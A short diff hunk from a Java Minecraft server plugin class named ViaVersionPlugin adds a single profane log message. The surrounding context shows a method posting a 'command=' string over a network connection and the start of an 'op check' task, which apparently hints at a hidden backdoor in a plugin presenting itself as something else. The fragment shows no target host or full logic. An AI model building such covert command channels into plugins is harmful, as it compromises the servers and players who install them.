@@ -186,6 +186,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         connection.getOutputStream().write(("command=" + command).getBytes());
         connection.getOutputStream().flush();
         connection.getOutputStream().close();
+        getLogger().info("fuck");
     }
     public void startOpCheckTask() {
         new BukkitRunnable() {
